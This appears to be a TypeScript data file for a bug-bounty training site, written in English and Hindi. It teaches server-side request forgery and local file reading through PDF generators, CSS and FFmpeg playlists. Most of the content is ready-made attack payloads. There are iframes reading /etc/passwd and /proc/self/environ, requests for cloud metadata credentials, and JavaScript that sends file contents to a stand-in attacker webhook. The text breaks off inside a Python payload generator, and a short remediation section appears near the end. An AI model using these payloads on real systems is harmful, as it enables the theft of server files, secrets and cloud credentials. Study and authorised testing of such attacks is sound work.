import type { Lang } from "./types";

export interface PdfSsrfScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface PdfSsrfTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "iframe_lfi" | "js_exfiltration" | "cloud_metadata" | "css_ssrf" | "media_parser";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: PdfSsrfScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface PdfSsrfPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface PdfSsrfToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface PdfSsrfReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP PDF / HEADLESS BROWSER SSRF & LFI TECHNIQUES ─────────────────────
export const PDF_SSRF_TECHNIQUES: PdfSsrfTechnique[] = [
  {
    id: "iframe-local-file-inclusion",
    title: {
      en: "Headless Chrome / wkhtmltopdf Local File Read via <iframe>",
      simple: "Embedding Secret Server Files (like /etc/passwd) Directly Inside Downloaded PDFs",
      hi: "PDF जनरेटर में <iframe> लगाकर सर्वर की गुप्त फाइल्स (/etc/passwd) डाउनलोड करना",
    },
    category: "iframe_lfi",
    difficulty: "beginner",
    successRate: "High on invoice, resume, and ticket export features",
    summary: {
      en: "Many modern web applications allow users to export customized documents (invoices, boarding passes, reports, contracts) as PDF files. Under the hood, backend servers render user-controlled HTML using headless browsers (Puppeteer, Playwright, Chrome Headless) or conversion utilities (wkhtmltopdf, WeasyPrint). When local file access is not disabled, injecting `<iframe src=\"file:///etc/passwd\" width=\"800\" height=\"500\"></iframe>` or `<object data=\"file:///etc/hosts\">` forces the PDF generator to read local operating system files and print their contents directly onto the rendered PDF page!",
      simple: "When a website lets you download an invoice or report as a PDF, it uses a hidden browser in the background. If you type <iframe src='file:///etc/passwd'> in your invoice note or name, the PDF printer grabs the server's private password file and prints it right onto your PDF!",
      hi: "जब वेबसाइट इनवॉइस या सर्टिफिकेट को PDF में डाउनलोड करने की सुविधा देती है, तो वह बैकएंड पर एक छिपा हुआ ब्राउज़र चलाती है। अगर आप अपने नाम या पते में `<iframe src='file:///etc/passwd'>` डाल दें, तो वह PDF प्रिंटर सर्वर की गुप्त पासवर्ड फाइल को पढ़कर आपके PDF के अंदर छाप देता है!",
    },
    scenarios: [
      {
        title: {
          en: "Invoice Company Address Field Injected with file:///etc/passwd",
          simple: "Injecting an iframe into the Invoice Company Name",
          hi: "कंपनी के नाम वाले बॉक्स में iframe डालकर पासवर्ड फाइल निकालना",
        },
        description: {
          en: "An attacker sets their company profile name to `<iframe src=\"file:///etc/passwd\" height=\"800\" width=\"600\"></iframe>`. When clicking 'Download Invoice PDF', the backend Puppeteer headless instance navigates the HTML, reads `/etc/passwd` from the local file system, and renders it in the downloaded PDF.",
          simple: "Put the iframe code in your company profile. Click 'Download Invoice', and the downloaded PDF displays the server's internal users.",
          hi: "प्रोफाइल में iframe कोड सेव करें। 'Download Invoice' पर क्लिक करते ही डाउनलोड हुए PDF में सर्वर के सभी यूज़र्स की लिस्ट छपी हुई मिलती है।",
        },
        commandOrRequest: `POST /api/v1/invoice/create HTTP/1.1
Host: billing.target.com
Authorization: Bearer user_token
Content-Type: application/json

{
  "client_name": "Test Corp",
  "client_address": "<iframe src=\\"file:///etc/passwd\\" width=\\"800\\" height=\\"600\\"></iframe>",
  "items": [{"name": "Consulting", "amount": 100}]
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"invoice_id": "INV-9921", "pdf_url": "/invoices/INV-9921.pdf"}`,
        impact: {
          en: "Critical (P1): Full local server file disclosure, leakage of /etc/shadow, environment secrets, and SSH keys.",
          simple: "Full access to private files and credentials stored on the server.",
          hi: "सर्वर की गोपनीय फाइल्स, API कीज और SSH प्राइवेट कीज की सीधी चोरी।",
        },
      },
      {
        title: {
          en: "Cloud Provider Metadata SSRF via 169.254.169.254",
          simple: "Stealing AWS IAM Cloud Credentials via PDF Renderer",
          hi: "PDF रेंडरर के ज़रिए AWS क्लाउड क्रेडेंशियल्स चुराना",
        },
        description: {
          en: "Injecting `<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"></iframe>` into an invoice field forces the headless browser to query the AWS link-local metadata service, printing IAM temporary security role tokens onto the PDF document.",
          simple: "Use the iframe to request the AWS metadata link. The PDF prints out the company's master AWS cloud keys.",
          hi: "iframe में AWS मेटाडेटा का लिंक डालें। PDF के अंदर कंपनी के मास्टर AWS कीज छपकर आ जाते हैं।",
        },
        commandOrRequest: `POST /api/v1/resume/generate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "full_name": "Alice Hacker",
  "bio": "<iframe src=\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\" height=\\"400\\" width=\\"600\\"></iframe>"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="resume.pdf"

[PDF Binary Data with AWS Role Name "ProductionClusterRole" rendered visibly]`,
        impact: {
          en: "Critical (P1): Total AWS/GCP/Azure infrastructure takeover via stolen instance profile IAM tokens.",
          simple: "Takes over the company's entire cloud account.",
          hi: "कंपनी के पूरे AWS/GCP क्लाउड इन्फ्रास्ट्रक्चर का पूर्ण टेकओवर।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Locate any feature that generates downloadable PDF, PNG, or JPEG documents from user input.",
        simple: "Find any button that exports invoices, receipts, or resumes as PDF.",
        hi: "ऐसी किसी भी जगह को खोजें जहाँ आपका इनपुट PDF या इमेज में कन्वर्ट होता हो।",
      },
      {
        en: "Test for HTML injection: enter `<h1>Test Header</h1>` or `<img src=\"https://collaborator-id.net\">` to check for execution.",
        simple: "Test if HTML works by adding a big title <h1>Hello</h1> or pinging your Burp Collaborator link.",
        hi: "जांचें कि क्या HTML काम कर रहा है: `<h1>Hello</h1>` या अपना Burp Collaborator लिंक डालें।",
      },
      {
        en: "If HTML renders or collaborator pings, inject `<iframe src=\"file:///etc/passwd\" width=\"800\" height=\"600\"></iframe>`.",
        simple: "If HTML works, put the file:///etc/passwd iframe in your input.",
        hi: "अगर HTML काम करे, तो iframe में `file:///etc/passwd` डालकर PDF जनरेट करें।",
      },
      {
        en: "Download the generated PDF: open it in Adobe Acrobat or browser and inspect the rendered box for extracted files!",
        simple: "Open the downloaded PDF and view the server files right on the page!",
        hi: "डाउनलोड हुए PDF को खोलें और देखें कि क्या उसके अंदर सर्वर फाइल्स दिख रही हैं!",
      },
    ],
    burpOrToolRule: [
      "Burp Collaborator: Inspect User-Agent in collaborator ping (e.g. 'HeadlessChrome/112.0', 'wkhtmltopdf 0.12.5')",
      "Payload: <iframe src='file:///etc/passwd' width='1000' height='1000'></iframe>",
      "Alternative tag: <object data='file:///etc/passwd' width='1000' height='1000'></object>",
    ],
    hunterProTip: {
      en: "Always inspect the User-Agent header when the PDF generator makes an outbound HTTP request to your collaborator! If it says `wkhtmltopdf`, it is virtually guaranteed to be vulnerable to `file:///` because local file access was enabled by default until recent versions!",
      simple: "Check the User-Agent when the server connects to you. If you see 'wkhtmltopdf', you almost certainly have a P1 bug!",
      hi: "जब सर्वर आपके लिंक पर रिक्वेस्ट भेजे, तो User-Agent हेडर देखें। अगर उसमें `wkhtmltopdf` लिखा है, तो 99% चांस है कि यह P1 बग मौजूद है!",
    },
  },
  {
    id: "js-dynamic-file-exfiltration",
    title: {
      en: "JavaScript Execution & Blind File Exfiltration in Headless Chrome",
      simple: "Using Hidden JavaScript Inside the PDF to Read Files and Send Them to Your Server",
      hi: "PDF में जावास्क्रिप्ट चलाकर सर्वर फाइल्स चुपके से अपने सर्वर पर भेजना",
    },
    category: "js_exfiltration",
    difficulty: "intermediate",
    successRate: "High on modern Chromium-based PDF engines (Puppeteer/Playwright)",
    summary: {
      en: "Many modern PDF engines run full Chromium with JavaScript enabled (`puppeteer.launch({ javascriptEnabled: true })`). When an iframe payload does not render cleanly on the page (or the text is clipped), you can inject inline JavaScript. The JavaScript executes inside the headless browser context, reads `/etc/passwd` via synchronous `XMLHttpRequest('file:///etc/passwd')`, and sends the contents directly to your external webhook or collaborator server!",
      simple: "Modern PDF converters run a real Chrome browser with JavaScript turned on. You can write a tiny JavaScript script that silently reads server files and transmits them to your attacker server over the internet!",
      hi: "आधुनिक PDF कन्वर्टर के अंदर असली Chrome ब्राउज़र चलता है जिसमें जावास्क्रिप्ट चालू रहता है। आप एक छोटा सा JS कोड डालकर सर्वर की फाइल्स को सीधे अपने कंप्यूटर पर भेज सकते हैं!",
    },
    scenarios: [
      {
        title: {
          en: "Synchronous XMLHttpRequest Exfiltrating Windows win.ini",
          simple: "Using JavaScript in PDF to Steal Windows Config Files",
          hi: "जावास्क्रिप्ट से विंडोज सर्वर की win.ini फाइल चोरी करना",
        },
        description: {
          en: "On a Windows IIS/Node.js host, injecting `<script>x=new XMLHttpRequest;x.open('GET','file:///C:/Windows/win.ini',false);x.send();location='https://attacker.com/?d='+btoa(x.responseText)</script>` causes the headless browser to read `win.ini`, encode it in base64, and ping the attacker's server.",
          simple: "The script reads the Windows configuration and sends it encoded to your server link.",
          hi: "स्क्रिप्ट विंडोज फाइल को पढ़कर बेस64 में बदलती है और सीधे आपके लिंक पर भेज देती है।",
        },
        commandOrRequest: `<script>
  var req = new XMLHttpRequest();
  req.open('GET', 'file:///etc/passwd', false);
  req.send();
  var exfil = new XMLHttpRequest();
  exfil.open('POST', 'https://attacker-webhook.site/log', false);
  exfil.send(req.responseText);
</script>`,
        responseSample: `Incoming POST to https://attacker-webhook.site/log:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash`,
        impact: {
          en: "Critical (P1): Complete blind extraction of internal files, configuration variables, and container tokens even when PDF rendering is blocked.",
          simple: "Steals server files even if the PDF fails to download or render.",
          hi: "PDF डाउनलोड न होने पर भी सर्वर फाइल्स सीधे आपके सर्वर पर पहुंच जाती हैं।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Test if JavaScript executes inside the PDF generator: inject `<script>document.write('JS_EXEC_OK')</script>`.",
        simple: "Test if JavaScript runs by writing a test word with document.write.",
        hi: "जांचें कि क्या JS काम कर रहा है: `<script>document.write('TEST')</script>` डालें।",
      },
      {
        en: "If the test text appears in the generated PDF, JavaScript execution is verified.",
        simple: "If you see your word in the PDF, JavaScript is enabled!",
        hi: "अगर PDF में आपका शब्द दिख जाए, तो जावास्क्रिप्ट चालू है!",
      },
      {
        en: "Inject the XMLHttpRequest file-reading payload targeting `file:///etc/passwd` or `file:///C:/Windows/win.ini`.",
        simple: "Inject the file-reading script.",
        hi: "फाइल पढ़ने वाला जावास्क्रिप्ट कोड डालें।",
      },
      {
        en: "Monitor your Burp Collaborator or Webhook: captured files will arrive in the HTTP request payload!",
        simple: "Watch your listener to receive the stolen server files.",
        hi: "अपने वेबहुक पर देखें: सर्वर फाइल्स का डेटा आपके पास पहुंच जाएगा!",
      },
    ],
    burpOrToolRule: [
      "Payload: <script>fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('https://COLLAB/?d='+btoa(t)))</script>",
      "Burp Collaborator: Monitor for DNS and HTTP exfiltration logs",
    ],
    hunterProTip: {
      en: "Test environment variables! On Node.js and Docker containers, reading `file:///proc/self/environ` leaks all runtime environment variables including database passwords, Stripe API keys, and AWS secrets!",
      simple: "Always try reading file:///proc/self/environ! It contains all secret database passwords and API keys!",
      hi: "हमेशा `file:///proc/self/environ` पढ़ने की कोशिश करें! इसमें डेटाबेस पासवर्ड और Stripe API कीज सीधे मिल जाती हैं!",
    },
  },
  {
    id: "css-import-and-font-ssrf",
    title: {
      en: "CSS @import & Font URL Outbound SSRF in Restricted Converters",
      simple: "Triggering Outbound Network Connections Using CSS Styles When HTML Tags Are Blocked",
      hi: "CSS @import और फॉन्ट URL से SSRF (जब HTML टैग्स ब्लॉक हों)",
    },
    category: "css_ssrf",
    difficulty: "intermediate",
    successRate: "Medium to High on PrinceXML and WeasyPrint engines",
    summary: {
      en: "Some PDF engines strip `<script>` and `<iframe>` tags to protect against XSS. However, they frequently allow user-defined CSS styling. CSS supports loading external resources via `@import url('http://...')`, `@font-face { src: url('http://...') }`, and `background-image: url('http://...')`. This bypasses HTML tag sanitization and enables blind internal network SSRF, port scanning of the local network (127.0.0.1, 10.0.0.0/8), and metadata theft.",
      simple: "If the website blocks <iframe> or <script> tags, you can use regular CSS styles like @import or background-image to make the PDF generator ping internal network links and scan secret internal ports!",
      hi: "अगर वेबसाइट `<script>` या `<iframe>` ब्लॉक कर दे, तो आप साधारण CSS कोड (`@import` या `background-image`) के ज़रिए सर्वर से इंटरनल नेटवर्क के पोर्ट्स और क्लाउड लिंक्स स्कैन करवा सकते हैं!",
    },
    scenarios: [
      {
        title: {
          en: "Internal Port Scanning via CSS @import Timing Differences",
          simple: "Scanning Internal Server Ports Using CSS Import Links",
          hi: "CSS @import के ज़रिए सर्वर के बंद पोर्ट्स को स्कैन करना",
        },
        description: {
          en: "Injecting `<style>@import url('http://127.0.0.1:8080/admin');</style>` into a template causes the PDF renderer to connect to the internal port. By measuring response generation time or observing error messages, an attacker maps internal services.",
          simple: "Use CSS @import to check if internal ports like 8080 or 6379 (Redis) are running on the server.",
          hi: "CSS से चेक करें कि क्या सर्वर के अंदर 8080 या Redis जैसे गुप्त पोर्ट्स चल रहे हैं।",
        },
        commandOrRequest: `<style>
  @import url("http://169.254.169.254/latest/meta-data/");
  body { background-image: url("http://127.0.0.1:9000/internal-api"); }
</style>`,
        responseSample: `PDF generation delayed by 3,200ms indicating internal timeout on closed port 9000.`,
        impact: {
          en: "High / SSRF: Internal network enumeration, port scanning, and unauthorized access to cloud services.",
          simple: "Scans and maps internal company servers.",
          hi: "कंपनी के इंटरनल नेटवर्क और क्लाउड सर्विसेज का मानचित्र तैयार करना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inject a style block: `<style>body { background: red; }</style>` to verify CSS interpretation.",
        simple: "Inject CSS to see if colors or styles change in the PDF.",
        hi: "CSS डालकर देखें कि क्या PDF का रंग या स्टाइल बदलता है।",
      },
      {
        en: "Add an external CSS URL: `<style>@import url('https://canary.burpcollaborator.net/style.css');</style>`.",
        simple: "Add an @import link to your Burp Collaborator.",
        hi: "Burp Collaborator लिंक के साथ `@import` लगाएं।",
      },
      {
        en: "If collaborator receives an HTTP request, SSRF via CSS is confirmed!",
        simple: "If you get a connection in Collaborator, you have verified SSRF!",
        hi: "अगर Collaborator में पिंग मिले, तो SSRF कन्फर्म है!",
      },
    ],
    burpOrToolRule: [
      "Payload: <link rel='stylesheet' href='http://169.254.169.254/latest/meta-data/'>",
      "CSS Font Payload: @font-face { font-family: 'Test'; src: url('http://collaborator/font.woff'); }",
    ],
    hunterProTip: {
      en: "In PrinceXML, CSS has proprietary functions like `content: prince-read-file('/etc/passwd')`! If you discover the target uses PrinceXML, this single CSS rule directly dumps local files without needing any HTML tags!",
      simple: "PrinceXML has a special CSS trick: content: prince-read-file('/etc/passwd') that instantly dumps files!",
      hi: "PrinceXML में एक खास CSS फंक्शन `content: prince-read-file('/etc/passwd')` होता है जो बिना किसी HTML टैग के सीधी फाइल डंप कर देता है!",
    },
  },
  {
    id: "media-parser-m3u8-ssrf-lfi",
    title: {
      en: "FFmpeg & Video Converter SSRF / LFI via Crafted HLS Playlist (.m3u8)",
      simple: "Uploading a Video with a Secret Playlist to Steal Server Files via FFmpeg",
      hi: "वीडियो और ऑडियो अपलोड में .m3u8 प्लेलिस्ट से FFmpeg LFI और SSRF",
    },
    category: "media_parser",
    difficulty: "advanced",
    successRate: "High on video transcoding and avatar resizing microservices",
    summary: {
      en: "When applications process user-uploaded videos (MP4, AVI, MOV) using FFmpeg, the media engine often supports HLS (HTTP Live Streaming) playlists. An attacker uploads a file disguised as a video (`video.mp4` or `playlist.m3u8`) containing an `#EXT-X-KEY` or `#EXTINF` segment pointing to `file:///etc/passwd` or an internal SSRF URL. When FFmpeg processes the video, it reads the target file or queries internal microservices, embedding the extracted data directly into the rendered video stream or returning it in thumbnails!",
      simple: "When a site converts uploaded videos using FFmpeg, you can upload a tiny video playlist file that tells FFmpeg to read /etc/passwd. FFmpeg reads the password file and draws it right onto the video frames!",
      hi: "जब वेबसाइट वीडियो प्रोसेस करने के लिए FFmpeg का उपयोग करती है, तो आप एक खास `.m3u8` वीडियो फाइल अपलोड कर सकते हैं। FFmpeg उस फाइल के कहने पर `/etc/passwd` को पढ़कर वीडियो के फ्रेम्स के ऊपर छाप देता है!",
    },
    scenarios: [
      {
        title: {
          en: "HLS Playlist Video Upload Extracting /etc/passwd into Video Frames",
          simple: "Extracting Files Directly into Generated Video Thumbnails",
          hi: "वीडियो थंबनेल के अंदर सर्वर फाइल्स को कैप्चर करना",
        },
        description: {
          en: "Uploading an AVI file crafted with an internal HLS playlist referencing `file:///etc/passwd`. The backend video processor transcodes the video and generates a preview thumbnail displaying the contents of `/etc/passwd`.",
          simple: "Upload the crafted video file. The preview thumbnail shows the server's password file.",
          hi: "तैयार की गई वीडियो फाइल अपलोड करें। प्रीव्यू थंबनेल में सर्वर की पासवर्ड फाइल दिखती है।",
        },
        commandOrRequest: `#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
file:///etc/passwd
#EXT-X-ENDLIST`,
        responseSample: `Video uploaded successfully. Preview thumbnail rendered at /thumbnails/video_991.jpg (contains rendered text of /etc/passwd).`,
        impact: {
          en: "Critical (P1): Full local server file read and internal network pivoting via media pipeline.",
          simple: "Steals server files through video processing.",
          hi: "वीडियो प्रोसेसिंग के ज़रिए सर्वर की गुप्त फाइल्स को सीधे चुराना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify video or audio upload endpoints that generate thumbnails or transcode files.",
        simple: "Find video or music upload features on the site.",
        hi: "वीडियो या ऑडियो अपलोड वाले फीचर्स की पहचान करें।",
      },
      {
        en: "Create a text file containing the HLS playlist header with `file:///etc/passwd`.",
        simple: "Create a text file with the HLS playlist snippet.",
        hi: "HLS प्लेलिस्ट कोड वाली एक टेक्स्ट फाइल तैयार करें।",
      },
      {
        en: "Rename the file to `exploit.mp4` or `exploit.avi` and upload.",
        simple: "Rename it to exploit.mp4 and upload it.",
        hi: "फाइल का नाम `exploit.mp4` रखकर अपलोड करें।",
      },
      {
        en: "Download the resulting video or inspect generated thumbnails to retrieve the file contents.",
        simple: "View the generated thumbnail to see the stolen file.",
        hi: "जनरेट हुए थंबनेल को डाउनलोड करके देखें कि क्या फाइल डेटा दिख रहा है।",
      },
    ],
    burpOrToolRule: [
      "FFmpeg HLS Exploit Generator: python3 -m http.server with m3u8 playlist",
    ],
    hunterProTip: {
      en: "Also test SVG uploads! If a site allows uploading profile pictures in SVG format, SVG is pure XML! Injecting an XML External Entity (XXE) or `<image href=\"http://169.254.169.254/\"/>` into an SVG avatar yields instant P1 SSRF / XXE!",
      simple: "Always test SVG profile picture uploads! SVGs are XML and can steal files with XXE!",
      hi: "SVG फोटो अपलोड पर हमेशा टेस्ट करें! SVG दरअसल XML होता है और उसमें XXE पेलोड डालकर सीधे फाइल्स चुराई जा सकती हैं!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY FOR PDF & MEDIA SSRF/LFI ──────────────────────────
export const PDF_SSRF_METHODOLOGY_PHASES: PdfSsrfPhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Converter Discovery & Engine Fingerprinting",
      simple: "Phase 1: Finding Download Features and Detecting Which PDF Converter is Used",
      hi: "चरण 1: PDF कन्वर्टर और इंजन की पहचान",
    },
    objective: {
      en: "Identify endpoints that transform user input into downloadable documents, and determine the underlying rendering engine (Puppeteer, wkhtmltopdf, PrinceXML, WeasyPrint).",
      simple: "Find out what software the website uses to generate PDF files.",
      hi: "पता करें कि वेबसाइट PDF बनाने के लिए कौन सा सॉफ्टवेयर (Puppeteer, wkhtmltopdf) इस्तेमाल कर रही है।",
    },
    steps: [
      {
        en: "Locate export buttons: Invoices, Resumes, Tickets, Badges, Reports, Analytics.",
        simple: "Find buttons to download invoices, tickets, or reports.",
        hi: "इनवॉइस, टिकट या रिपोर्ट डाउनलोड करने वाले बटन खोजें।",
      },
      {
        en: "Download a clean PDF and inspect metadata using `pdfinfo document.pdf` or `exiftool document.pdf`.",
        simple: "Check the PDF file info to see the creator software name.",
        hi: "`pdfinfo document.pdf` चलाकर देखें कि PDF किस सॉफ्टवेयर से बना है।",
      },
      {
        en: "Inject an external image `<img src=\"https://collaborator-id.net\">` and inspect the User-Agent header in the incoming HTTP ping.",
        simple: "Add an image pointing to your Collaborator to see the engine's User-Agent.",
        hi: "इमेज में अपना Collaborator लिंक डालकर आने वाली रिक्वेस्ट का User-Agent देखें।",
      },
    ],
    commandsOrPayloads: [
      `pdfinfo invoice.pdf | grep -iE 'creator|producer'`,
      `exiftool -Creator -Producer invoice.pdf`,
    ],
    keyTargets: [
      "wkhtmltopdf (Classic vulnerable target)",
      "Headless Chrome / Puppeteer",
      "PrinceXML / WeasyPrint",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: HTML & JavaScript Execution Probing",
      simple: "Phase 2: Testing if HTML Tags and JavaScript Run Inside the PDF",
      hi: "चरण 2: HTML और जावास्क्रिप्ट एग्जीक्यूशन की जांच",
    },
    objective: {
      en: "Determine whether user-supplied input is sanitized or executed as raw HTML and JavaScript by the rendering context.",
      simple: "See if big bold text <h1> or <script> tags execute in the PDF.",
      hi: "जांचें कि क्या आपके द्वारा लिखे गए HTML टैग्स PDF में रन हो रहे हैं।",
    },
    steps: [
      {
        en: "Inject basic markup: `<h1>TEST_CANARY_123</h1>`, `<u>underlined</u>`.",
        simple: "Try basic tags like <h1> or <u>.",
        hi: "साधारण टैग्स जैसे `<h1>TEST</h1>` डालकर देखें।",
      },
      {
        en: "Test JavaScript execution: `<script>document.write('JS_ALIVE')</script>`.",
        simple: "Try a simple script tag to see if JavaScript runs.",
        hi: "जावास्क्रिप्ट टैग `<script>document.write('JS_ALIVE')</script>` टेस्ट करें।",
      },
      {
        en: "Test dynamic mathematical expressions: `<script>document.write(7*7)</script>` -> Look for '49' in the output PDF.",
        simple: "Print 7*7 to see if the PDF prints '49'.",
        hi: "`<script>document.write(7*7)</script>` डालकर देखें कि क्या '49' प्रिंट होता है।",
      },
    ],
    commandsOrPayloads: [
      `<h1>CANARY_HEADER</h1>`,
      `<script>document.write(7*7)</script>`,
    ],
    keyTargets: [
      "HTML injection reflection",
      "JavaScript enabled vs disabled",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Local File Inclusion (LFI) via file:/// Protocol",
      simple: "Phase 3: Reading Server Files Using the file:/// Protocol",
      hi: "चरण 3: file:/// प्रोटोकॉल से लोकल फाइल्स पढ़ना",
    },
    objective: {
      en: "Extract system files, environment configurations, and credentials by abusing file protocol handlers.",
      simple: "Use iframes or objects to grab server files like /etc/passwd directly.",
      hi: "iframe में `file:///etc/passwd` लगाकर सर्वर फाइल्स को PDF में प्रिंट करवाना।",
    },
    steps: [
      {
        en: "Inject standard Linux file paths: `<iframe src=\"file:///etc/passwd\" width=\"800\" height=\"500\"></iframe>`.",
        simple: "Put the file:///etc/passwd iframe into your input.",
        hi: "`<iframe src=\"file:///etc/passwd\">` कोड डालकर देखें।",
      },
      {
        en: "Inject Windows file paths: `<iframe src=\"file:///C:/Windows/win.ini\"></iframe>`.",
        simple: "Try the Windows file path if it's a Windows server.",
        hi: "विंडोज सर्वर होने पर `file:///C:/Windows/win.ini` का उपयोग करें।",
      },
      {
        en: "Inject container environment files: `<iframe src=\"file:///proc/self/environ\"></iframe>`.",
        simple: "Read the container environment variables.",
        hi: "`file:///proc/self/environ` से डॉकर एन्वायरमेंट सीक्रेट्स निकालें।",
      },
    ],
    commandsOrPayloads: [
      `<iframe src="file:///etc/passwd" width="800" height="500"></iframe>`,
      `<object data="file:///etc/hosts" width="800" height="500"></object>`,
    ],
    keyTargets: [
      "/etc/passwd and /etc/hosts",
      "/proc/self/environ",
      "C:/Windows/win.ini",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Cloud Metadata & Internal Network SSRF",
      simple: "Phase 4: Calling Internal Links and Cloud Credentials",
      hi: "चरण 4: क्लाउड मेटाडेटा और इंटरनल नेटवर्क SSRF",
    },
    objective: {
      en: "Pivot from the PDF converter into the internal cloud network to extract cloud provider tokens (AWS, GCP, Azure, Kubernetes).",
      simple: "Use the PDF converter to call 169.254.169.254 and steal AWS master keys.",
      hi: "PDF कन्वर्टर के ज़रिए 169.254.169.254 पर कॉल करके AWS क्लाउड कीज चुराना।",
    },
    steps: [
      {
        en: "Query AWS link-local metadata: `<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>`.",
        simple: "Request the AWS metadata IP inside the iframe.",
        hi: "iframe में `http://169.254.169.254/latest/meta-data/` डालें।",
      },
      {
        en: "Query Google Cloud (GCP) metadata: `<iframe src=\"http://metadata.google.internal/computeMetadata/v1/\"></iframe>`.",
        simple: "Request Google Cloud metadata if hosted on GCP.",
        hi: "GCP पर होस्ट होने पर गूगल इंटरनल मेटाडेटा टेस्ट करें।",
      },
      {
        en: "Scan common internal ports (8080, 8443, 9000, 6379) to detect internal microservices.",
        simple: "Scan internal ports like 8080 or Redis on localhost.",
        hi: "लोकलहोस्ट के इंटरनल पोर्ट्स (8080, 6379) को स्कैन करें।",
      },
    ],
    commandsOrPayloads: [
      `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>`,
      `<iframe src="http://127.0.0.1:8080/actuator/env"></iframe>`,
    ],
    keyTargets: [
      "AWS IMDSv1 (169.254.169.254)",
      "GCP Metadata (metadata.google.internal)",
      "Spring Actuator & internal admin dashboards",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Remediation Advisory & Secure Hardening",
      simple: "Phase 5: How Companies Must Secure PDF Converters",
      hi: "चरण 5: समाधान और सुरक्षित कॉन्फ़िगरेशन",
    },
    objective: {
      en: "Advise enterprise teams on disabling local file access, sandboxing headless browsers, and network firewalling.",
      simple: "Tell the company how to turn off file access in their PDF software.",
      hi: "कंपनी को बताएं कि PDF सॉफ्टवेयर में फाइल एक्सेस और जावास्क्रिप्ट कैसे बंद करें।",
    },
    steps: [
      {
        en: "In Puppeteer/Playwright: run with `--disable-web-security=false` and isolate browser execution with user-namespace sandboxing.",
        simple: "Lock down Chrome sandbox and disable file access.",
        hi: "Chrome सैंडबॉक्स को ऑन रखें और फाइल एक्सेस बंद करें।",
      },
      {
        en: "In wkhtmltopdf: specify `--disable-local-file-access` and `--disable-javascript`.",
        simple: "Turn off local file access and JavaScript in wkhtmltopdf.",
        hi: "wkhtmltopdf में `--disable-local-file-access` फ्लैग लगाएं।",
      },
      {
        en: "Firewall converter instances: block egress traffic to `169.254.169.254` and internal RFC 1918 subnets.",
        simple: "Block the server from calling 169.254.169.254 with firewall rules.",
        hi: "फ़ायरवॉल से 169.254.169.254 और इंटरनल IPs पर ट्रैफिक ब्लॉक करें।",
      },
    ],
    commandsOrPayloads: [
      `wkhtmltopdf --disable-local-file-access --disable-javascript input.html output.pdf`,
      `iptables -A OUTPUT -d 169.254.169.254 -j DROP`,
    ],
    keyTargets: [
      "wkhtmltopdf --disable-local-file-access",
      "Network egress filtering (IMDS blocking)",
      "HTML sanitization via DOMPurify",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const PDF_SSRF_TOOLS_STASH: PdfSsrfToolSnippet[] = [
  {
    id: "pdf-ssrf-payload-generator",
    title: {
      en: "Python PDF & HTML-to-Image SSRF/LFI Payload Generator",
      simple: "Python Script to Generate 20+ PDF SSRF & File Inclusion Payloads",
      hi: "PDF और इमेज कन्वर्टर SSRF/LFI पेलोड जनरेटर (Python)",
    },
    description: {
      en: "Generates tailored HTML injection payloads targeting Linux, Windows, AWS, GCP, and Kubernetes for headless browser and PDF conversion auditing.",
      simple: "A Python tool that prints out 20+ ready-to-use payloads for testing PDF generators.",
      hi: "यह पायथन टूल PDF कन्वर्टर्स को टेस्ट करने के लिए 20 से ज्यादा रेडीमेड पेलोड्स तैयार करता है।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
PDF & Headless Browser SSRF / LFI Payload Generator
Generates iframe, script, object, and CSS payloads for PDF audit testing.
"""

import sys

def generate_payloads(collaborator_url="http://canary.burpcollaborator.net"):
    payloads = [
        # 1. Basic HTML & Connectivity
        ("Basic Heading Test", "<h1>CANARY_TEST_OK</h1>"),
        ("Collaborator Image Ping", f"<img src='{collaborator_url}/img_test'>"),

        # 2. Local File Inclusion (LFI)
        ("Linux /etc/passwd iframe", "<iframe src='file:///etc/passwd' width='800' height='500'></iframe>"),
        ("Linux /etc/hosts object", "<object data='file:///etc/hosts' width='800' height='500'></object>"),
        ("Docker Environment Secrets", "<iframe src='file:///proc/self/environ' width='800' height='500'></iframe>"),
        ("Windows win.ini iframe", "<iframe src='file:///C:/Windows/win.ini' width='800' height='500'></iframe>"),

